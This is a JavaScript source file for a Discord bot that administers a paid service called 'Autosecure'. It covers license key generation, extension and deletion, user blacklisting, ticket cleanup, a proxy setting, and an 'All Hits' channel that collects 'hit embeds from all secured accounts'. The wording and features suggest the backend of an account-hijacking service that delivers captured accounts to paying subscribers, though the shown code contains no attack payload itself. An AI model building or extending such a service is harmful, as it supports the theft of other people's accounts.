    await sendremovalmsg(client, userId, removalEmbed);
    
  
    await deleteuser(client, userId);
    
 
    await autosecurelogs(client, "remove", userId, interaction.user.id, null, reason);
    
    await interaction.editReply({
      content: `User <@${userId}> has been removed!`,
      ephemeral: true
    });
    
  } catch (error) {
    console.error('Error in handleremoveuser:', error);
    await interaction.editReply({
      content: 'An error occurred while processing this request.',
      ephemeral: true
    });
  }
}



const sendremovalmsg = async (client, userId, removalEmbed) => {
  try {
    const user = await client.users.fetch(userId);
    if (!user) throw new Error('User not found');
    await user.send({ embeds: [removalEmbed] });
    await sendFullConfigToUser(userId, client)
  } catch (error) {
    console.error(`Failed to send config and notification to user ${userId}:`, error);
  }
};

async function handleDeleteAll(client, interaction) {
  const embed2 = new EmbedBuilder()
      .setTitle('Delete all Unused Licenses!')
      .setDescription('This action cannot be undone.')
      .setColor('#5f9ea0');

  const button = new ButtonBuilder()
      .setCustomId('deletealllicenses')
      .setLabel('Confirm')
      .setStyle(ButtonStyle.Primary);

  const row = new ActionRowBuilder().addComponents(button);

  await interaction.reply({
      embeds: [embed2],
      components: [row],
      ephemeral: true
  });
}
function formatTimestamp(timestamp) {
  if (!timestamp) return 'Never';
  
  try {
    return new Date(parseInt(timestamp)).toLocaleString();
  } catch (e) {
    return 'Invalid date';
  }
}



async function handleCreateKey(client, interaction) {
  try {
    const amount = interaction.options.getInteger('amount') || 1;
    const durationDays = interaction.options.getString('duration');
    const user = interaction.options.getString("user_id")
    if (user){
      return interaction.reply({
        content: `Giving a license to user is deprecated!`,
        ephemeral: true,
      })
    }

    if (!durationDays) {
      return interaction.reply({ 
        content: "You must specify a duration for the license keys.", 
        ephemeral: true 
      });
    }

    const durationNum = parseFloat(durationDays);
    if (isNaN(durationNum) || durationNum <= 0) {
      return interaction.reply({ 
        content: "Please provide a valid positive number for duration in days.", 
        ephemeral: true 
      });
    }

    await interaction.deferReply({ ephemeral: true });

    try {
      const generatedLicenses = [];

      for (let i = 0; i < amount; i++) {
        const key = `${footer1}-${generate(16)}`;
        await queryParams('INSERT INTO licenses(license, duration) VALUES(?, ?)', [key, durationNum]);
        generatedLicenses.push(key);
      }

      let responseContent = `Generated ${amount} license key${amount > 1 ? 's' : ''}:`;
      responseContent += `\nDuration: ${durationNum} days`;
responseContent += `\n\n\`\`\`\n${generatedLicenses.join('\n')}\n\`\`\``;


      await interaction.editReply({ content: responseContent });
      let generatetext = `${amount}|${durationNum}`;

      autosecurelogs(client, "generatelicenses", interaction.user.id, null, null, null, generatetext);

    } catch (e) {
      console.error("License generation error:", e);
      await interaction.editReply({ 
        content: `Failed to generate license keys. Error: ${e.message}` 
      });
    }

  } catch (error) {
    console.error("Error in handleCreateKey:", error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ 
        content: "An error occurred while generating license keys.", 
        ephemeral: true 
      });
    } else if (interaction.deferred) {
      await interaction.editReply({ 
        content: "An error occurred while generating license keys." 
      });
    }
  }
}



/// Dont give them new license keys ofc

async function handleDeleteKey(client, interaction) {
  try {
    const key = interaction.options.getString('key');
    
    try {
      const licenseExists = await queryParams(`SELECT * FROM licenses WHERE license=?`, [key]);
      
      if (licenseExists.length === 0) {
        return interaction.reply({
          content: 'This license key does not exist.',
          ephemeral: true
        });
      }
      await queryParams(`DELETE FROM licenses WHERE license=?`, [key]);
      
      await interaction.reply({
        content: `License key ${key} has been deleted successfully.`,
        ephemeral: true
      });
      
      let generatetext = `${key}`
      autosecurelogs(client, "deletelicense", interaction.user.id, null, null, null, generatetext);

    } catch (e) {
      console.error("License deletion error:", e);
      await interaction.reply({
        content: 'An error occurred while deleting the license key.',
        ephemeral: true
      });
    }
  } catch (error) {
    console.error("Error in handleDeleteKey:", error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ 
        content: "An error occurred while deleting the license key.", 
        ephemeral: true 
      });
    }
  }
}

async function handleExtendAllKeys(client, interaction) {
  try {
    const duration = interaction.options.getString('duration');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    
    const daysNum = parseFloat(duration);
    console.log(`days num: ${daysNum}`);
    if (isNaN(daysNum) || daysNum <= 0) {
      return interaction.reply({
        content: 'Please provide a valid positive number for duration in days.',
        ephemeral: true
      });
    }
    
    await interaction.deferReply({ ephemeral: true });
    
    try {
      const usedLicenses = await queryParams(`SELECT license, expiry, user_id FROM usedLicenses`, []);
      let updatedUsed = 0;
      const MS_PER_DAY = 86400000;

      for (const license of usedLicenses) {
        const currentExpiry = license.expiry ? parseInt(license.expiry) : Date.now();
        const newExpiry = currentExpiry + (daysNum * MS_PER_DAY);
        const newExpiryStr = newExpiry.toString();

        await queryParams(`UPDATE usedLicenses SET expiry = ? WHERE license = ?`, [newExpiryStr, license.license]);
        updatedUsed++;

        if (license.user_id) {
          try {
            const user = await client.users.fetch(license.user_id);
            if (user) {
              const embed = {
                title: "License Extended",
                color: 0x00ff99,
                description: `Your Autosecure subscription has been extended!`,
                fields: [
                  { name: "Existing License", value: `\`${license.license}\``, inline: false },
                  { name: "Extension", value: `${daysNum} day(s)`, inline: true },
                  { name: "New Expiration", value: `<t:${Math.floor(newExpiry / 1000)}:R>`, inline: true },
                  { name: "Reason", value: reason, inline: false }
                ]
              };
              await user.send({ embeds: [embed] });
            }
          } catch (dmErr) {
            console.warn(`Failed to DM user ${license.user_id}:`, dmErr.message);
          }
        }
      }

      await interaction.editReply({
        content: `Successfully extended ${updatedUsed} used license keys by ${duration} days.`
      });

      const extendtext = `${updatedUsed}|${duration}`;
      autosecurelogs(client, "extendlicenses", interaction.user.id, null, null, null, extendtext);

    } catch (e) {
      console.error("Key extension error:", e);
      await interaction.editReply({
        content: `An error occurred while extending used license keys: ${e.message}`
      });
    }
  } catch (error) {
    console.error("Error in handleExtendAllKeys:", error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ 
        content: "An error occurred while extending used keys.", 
        ephemeral: true 
      });
    } else if (interaction.deferred) {
      await interaction.editReply({ 
        content: "An error occurred while extending used keys." 
      });
    }
  }
}

async function handleViewKeys(client, interaction) {
  try {
    try {
      const licenses = await queryParams(`SELECT license, duration FROM licenses`);
      
      if (licenses.length === 0) {
        return interaction.reply({
          content: 'No unused license keys found.',
          ephemeral: true
        });
      }
      
      const embed = new EmbedBuilder()
        .setTitle('All Unused License Keys')
        .setColor('#0099ff')
        .setTimestamp();
      const formattedLicenses = licenses.map(l => {
        const durationInfo = l.duration ? ` | Duration: ${l.duration} days` : ' | No expiration';
        return `${l.license}${durationInfo}`;
      });
      const licenseChunks = [];
      const chunkSize = 15; // Reduced chunk size due to increased text per license
      
      for (let i = 0; i < formattedLicenses.length; i += chunkSize) {
        licenseChunks.push(formattedLicenses.slice(i, i + chunkSize));
      }
      
      if (licenseChunks.length === 1) {
        embed.setDescription(licenseChunks[0].join('\n'));
        await interaction.reply({
          embeds: [embed],
          ephemeral: true
        });
      } else {
        let currentPage = 0;
        
        const updateEmbed = () => {
          return new EmbedBuilder()
            .setTitle(`All Unused License Keys (Page ${currentPage + 1}/${licenseChunks.length})`)
            .setDescription(licenseChunks[currentPage].join('\n'))
            .setColor('#0099ff')
            .setTimestamp();
        };
        
        const prevButton = new ButtonBuilder()
          .setCustomId('prev_page')
          .setLabel('Previous')
          .setStyle(ButtonStyle.Primary)
          .setDisabled(true);
        
        const nextButton = new ButtonBuilder()
          .setCustomId('next_page')
          .setLabel('Next')
          .setStyle(ButtonStyle.Primary)
          .setDisabled(licenseChunks.length <= 1);
        
        const row = new ActionRowBuilder().addComponents(prevButton, nextButton);
        
        const reply = await interaction.reply({
          embeds: [updateEmbed()],
          components: [row],
          ephemeral: true
        });
        
        const filter = i => 
          (i.customId === 'prev_page' || i.customId === 'next_page') && 
          i.user.id === interaction.user.id;
        
        const collector = interaction.channel.createMessageComponentCollector({ 
          filter, 
          time: 60000 
        });
        
        collector.on('collect', async i => {
          if (i.customId === 'prev_page' && currentPage > 0) {
            currentPage--;
          } else if (i.customId === 'next_page' && currentPage < licenseChunks.length - 1) {
            currentPage++;
          }
          
          prevButton.setDisabled(currentPage === 0);
          nextButton.setDisabled(currentPage === licenseChunks.length - 1);
          
          await i.update({
            embeds: [updateEmbed()],
            components: [new ActionRowBuilder().addComponents(prevButton, nextButton)]
          });
        });
        
        collector.on('end', () => {
          prevButton.setDisabled(true);
          nextButton.setDisabled(true);
          
          interaction.editReply({
            embeds: [updateEmbed()],
            components: [new ActionRowBuilder().addComponents(prevButton, nextButton)]
          }).catch(() => {});
        });
      }
    } catch (e) {
      console.error("License fetch error:", e);
      await interaction.reply({
        content: `An error occurred while fetching license keys: ${e.message}`,
        ephemeral: true
      });
    }
  } catch (error) {
    console.error("Error in handleViewKeys:", error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ 
        content: "An error occurred while fetching license keys.", 
        ephemeral: true 
      });
    }
  }
}


async function handleBlacklistUser(client, interaction) {
  try {
    const userId = interaction.options.getString('user_id');
    const reason = interaction.options.getString('reason') || 'No reason provided';
    
    try {
      const existingBlacklist = await queryParams(`SELECT * FROM autosecureblacklist WHERE user_id=?`, [userId]);
      
      if (existingBlacklist.length > 0) {
        return interaction.reply({
          content: `User <@${userId}> is already blacklisted.`,
          ephemeral: true
        });
      }
      await queryParams(`INSERT INTO autosecureblacklist(user_id, reason) VALUES(?, ?)`, [userId, reason]);
      const hadAccess = await hasAccess(userId);
      
      if (hadAccess) {
        deleteuser(client, userId);
      }
      const blacklistEmbed = {
        color: 0xADD8E6, // Red color
        title: 'User Blacklisted',
        description: `<@${userId}> has been blacklisted from Autosecure`,
        timestamp: new Date()
      };
      await interaction.channel.send({ embeds: [blacklistEmbed] });
      await interaction.reply({
        content: `Successfully blacklisted <@${userId}>.`,
        ephemeral: true
      });
      try {
        const userToNotify = await client.users.fetch(userId);
        await userToNotify.send({
          content: `You have been blacklisted from using Auto Secure by <@${interaction.user.id}>. Reason: ${reason}`
        });
      } catch (dmError) {
        console.log(`Could not send DM to blacklisted user ${userId}`);
      }
      
      autosecurelogs(client, "blacklist", interaction.user.id, userId, null, reason);
    } catch (e) {
      console.error("Blacklist user error:", e);
      await interaction.reply({
        content: `An error occurred while blacklisting the user: ${e.message}`,
        ephemeral: true
      });
    }
  } catch (error) {
    console.error("Error in handleBlacklistUser:", error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ 
        content: "An error occurred while blacklisting the user.", 
        ephemeral: true 
      });
    }
  }
}
async function handleUnblacklistUser(client, interaction) {
  try {
    const userId = interaction.options.getString('user_id');
    
    try {
      const existingBlacklist = await queryParams(`SELECT * FROM autosecureblacklist WHERE user_id=?`, [userId]);
      
      if (existingBlacklist.length === 0) {
        return interaction.reply({
          content: `User <@${userId}> is not blacklisted.`,
          ephemeral: true
        });
      }
      await queryParams(`DELETE FROM autosecureblacklist WHERE user_id=?`, [userId]);
      
      await interaction.reply({
        content: `User <@${userId}> has been removed from the blacklist.`,
        ephemeral: true
      });
      try {
        const userToNotify = await client.users.fetch(userId);
        await userToNotify.send({
          content: `You have been unblacklisted from Auto Secure by <@${interaction.user.id}>.`
        });
      } catch (dmError) {
        console.log(`Could not send DM to unblacklisted user ${userId}`);
      }
      
      
      autosecurelogs(client, "unblacklist", interaction.user.id, userId);

    } catch (e) {
      console.error("Unblacklist user error:", e);
      await interaction.reply({
        content: `An error occurred while unblacklisting the user: ${e.message}`,
        ephemeral: true
      });
    }
  } catch (error) {
    console.error("Error in handleUnblacklistUser:", error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ 
        content: "An error occurred while unblacklisting the user.", 
        ephemeral: true 
      });
    }
  }
}
async function handleViewBlacklist(client, interaction) {
  try {
    try {
      const blacklistedUsers = await queryParams(`SELECT user_id, reason FROM autosecureblacklist`);
      
      if (blacklistedUsers.length === 0) {
        return interaction.reply({
          content: 'No users are currently blacklisted.',
          ephemeral: true
        });
      }
      
      const embed = new EmbedBuilder()
        .setTitle('Blacklisted Users')
        .setColor('#FF0000')
        .setDescription(
          blacklistedUsers.map(user => 
            `<@${user.user_id}> - ${user.reason || 'No reason provided'}`
          ).join('\n')
        )
        .setTimestamp();
      
      await interaction.reply({
        embeds: [embed],
        ephemeral: true
      });
    } catch (e) {
      console.error("Blacklist fetch error:", e);
      await interaction.reply({
        content: `An error occurred while fetching the blacklist: ${e.message}`,
        ephemeral: true
      });
    }
  } catch (error) {
    console.error("Error in handleViewBlacklist:", error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ 
        content: "An error occurred while fetching the blacklist.", 
        ephemeral: true 
      });
    }
  }
}
async function handleViewUsers(client, interaction) {
  try {
    const users = await queryParams('SELECT user_id, expiry FROM usedLicenses');

    if (!users || users.length === 0) {
      return interaction.reply({
        content: 'No users found.',
        ephemeral: true
      });
    }

    const userDetails = await Promise.all(users.map(async (user) => {
      const discordUser = await client.users.fetch(user.user_id).catch(() => null);
      const username = discordUser ? discordUser.username : 'Unknown User';
      const expiry = user.expiry ? `<t:${Math.floor(Number(user.expiry) / 1000)}:R>` : 'Never';
      return { username, expiry, rawExpiry: user.expiry ? Number(user.expiry) : null };
    }));

    userDetails.sort((a, b) => {
      if (a.rawExpiry === null) return 1;
      if (b.rawExpiry === null) return -1;
      return a.rawExpiry - b.rawExpiry;
    });

    const embed = {
      title: 'All Users with Access',
      color: 0x0099ff,
      description: userDetails.map(user => `${user.username} - Expires: ${user.expiry}`).join('\n'),
      timestamp: new Date()
    };

    await interaction.reply({
      embeds: [embed],
      ephemeral: true
    });
  } catch (error) {
    console.error('Error in handleViewUsers:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({
        content: 'An error occurred',
        ephemeral: true
      });
    }
  }
}



async function showproxy(interaction) {
  const results = await queryParams("SELECT proxy FROM controlbot WHERE id = ?", ["1"]);
  
  if (results.length > 0 && results[0].proxy && results[0].proxy.trim() !== "") {
    interaction.reply({
      ephemeral: true,
      content: results[0].proxy
    });
  } else {
    interaction.reply({
      ephemeral: true,
      content: `None set!`
    });
  }
}

async function handleProxyModal(interaction) {
  const modal = new ModalBuilder()
      .setCustomId('proxyinput')
      .setTitle('Set Proxy');

  const proxyInput = new TextInputBuilder()
      .setCustomId('proxy_input')
      .setLabel('Enter your proxy (host:port:user:pass)')
      .setStyle(TextInputStyle.Short)
      .setRequired(true)
      .setPlaceholder('e.g., private-eu.vital-proxies.com:8603:user:pass');

  const firstActionRow = new ActionRowBuilder().addComponents(proxyInput);
  modal.addComponents(firstActionRow);

  await interaction.showModal(modal);
}

async function deletetickets(client, interaction) {
  try {
    await interaction.deferReply({ ephemeral: true });
    
    if (!config.ticketscategory) {
      return interaction.editReply({
        content: "Ticket category ID is not configured in the config file.",
        ephemeral: true
      });
    }

    const category = await client.channels.fetch(config.ticketscategory).catch(() => null);
    
    if (!category) {
      return interaction.editReply({
        content: "Could not find the ticket category.",
        ephemeral: true
      });
    }

    const tickets = category.children.cache;
    let deletedCount = 0;

    await Promise.all(tickets.map(async channel => {
      try {
        await channel.delete();
        deletedCount++;
      } catch (error) {
        console.error(`Failed to delete channel ${channel.id}:`, error);
      }
    }));

    interaction.editReply({
      content: `Successfully deleted ${deletedCount} ticket channels.`,
      ephemeral: true
    });
  } catch (error) {
    console.error("Error in deletetickets function:", error);
    interaction.editReply({
      content: "An error occurred while trying to delete tickets.",
      ephemeral: true
    });
  }
}

async function handleAllHits(client, interaction) {
  if (!interaction.inGuild()) {
    return interaction.reply({ 
      content: "This command can only be used in a server.", 
      ephemeral: true 
    });
  }

  try {
    const channelId = interaction.channelId;
    const guildId = interaction.guildId;
    const allhitsValue = `${channelId}|${guildId}`;

    // Update all bot configs with the allhits channel
    await queryParams(
      `UPDATE autosecure SET allhits_channel=?`,
      [allhitsValue],
      "run"
    );

    await interaction.reply({ 
      content: `✅ All Hits channel set to <#${channelId}>. Hit embeds from all secured accounts will now be sent here as well!`, 
      ephemeral: true 
    });
    
    // Send a test message to confirm
    try {
      await client.guilds.cache.get(guildId)?.channels.cache.get(channelId)?.send({
        embeds: [{
          title: "✅ All Hits Channel Configured",
          description: "All hit embeds from secured accounts will be sent to this channel!",
          color: 0x00ff00,
          timestamp: new Date().toISOString()
        }]
      });
    } catch (err) {
      console.error(`[ALLHITS] Could not send confirmation message: ${err.message}`);
    }
  } catch (error) {
    console.error("Error setting allhits channel:", error);
    await interaction.reply({ 
      content: `❌ Failed to set allhits channel: ${error.message}`, 
      ephemeral: true 
    });
  }
}
